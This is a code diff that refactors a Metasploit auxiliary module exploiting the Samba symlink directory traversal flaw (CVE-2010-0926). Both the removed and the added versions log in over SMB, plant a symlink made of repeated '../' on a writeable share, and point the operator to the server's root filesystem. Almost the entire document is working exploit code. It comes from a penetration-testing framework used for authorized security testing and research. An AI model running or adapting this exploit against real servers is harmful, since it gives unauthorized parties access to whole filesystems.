@@ -1,74 +1,66 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
 
+  # Exploit mixins should be called first
+  include Msf::Exploit::Remote::SMB::Client
+  include Msf::Auxiliary::Report
 
-require 'msf/core'
+  # Aliases for common classes
+  SIMPLE = Rex::Proto::SMB::SimpleClient
+  XCEPT = Rex::Proto::SMB::Exceptions
+  CONST = Rex::Proto::SMB::Constants
 
+  def initialize
+    super(
+      'Name' => 'Samba Symlink Directory Traversal',
+      'Description' => %(
+        This module exploits a directory traversal flaw in the Samba
+      CIFS server. To exploit this flaw, a writeable share must be specified.
+      The newly created directory will link to the root filesystem.
+      ),
+      'Author' => [
+        'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html
+        'hdm' # metasploit module
+      ],
+      'References' => [
+        ['CVE', '2010-0926'],
+        ['OSVDB', '62145'],
+        ['URL', 'http://www.samba.org/samba/news/symlink_attack.html'],
+        ['ATT&CK', Mitre::Attack::Technique::T1021_002_SMB_WINDOWS_ADMIN_SHARES]
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
+        'Reliability' => []
+      }
+    )
 
-class Metasploit3 < Msf::Auxiliary
+    register_options([
+      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
+      OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
+    ])
 
-	# Exploit mixins should be called first
-	include Msf::Exploit::Remote::SMB
-	include Msf::Auxiliary::Report
+    deregister_options('SMB::ProtocolVersion')
+  end
 
-	# Aliases for common classes
-	SIMPLE = Rex::Proto::SMB::SimpleClient
-	XCEPT  = Rex::Proto::SMB::Exceptions
-	CONST  = Rex::Proto::SMB::Constants
+  def run
+    print_status('Connecting to the server...')
+    connect(versions: [1])
+    smb_login
 
+    print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
+    simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
 
-	def initialize
-		super(
-			'Name'        => 'Samba Symlink Directory Traversal',
-			'Version'     => '$Revision$',
-			'Description' => %Q{
-				This module exploits a directory traversal flaw in the Samba
-			CIFS server. To exploit this flaw, a writeable share must be specified.
-			The newly created directory will link to the root filesystem.
-			},
-			'Author'      =>
-				[
-					'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html
-					'hdm'    # metasploit module
-				],
-			'References'  =>
-				[
-					['OSVDB', '62145'],
-					['URL', 'http://www.samba.org/samba/news/symlink_attack.html']
-				],
-			'License'     => MSF_LICENSE
-		)
+    print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
+    simple.client.symlink(datastore['SMBTARGET'], '../' * 10)
 
-		register_options([
-			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
-			OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
-		], self.class)
-
-	end
-
-
-	def run
-		print_status("Connecting to the server...")
-		connect()
-		smb_login()
-
-		print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
-		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
-
-		print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
-		self.simple.client.symlink(datastore['SMBTARGET'], "../" * 10)
-
-		print_status("Now access the following share to browse the root filesystem:")
-		print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
-		print_line("")
-	end
-
+    print_status('Now access the following share to browse the root filesystem:')
+    print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
+    print_line('')
+  end
 end
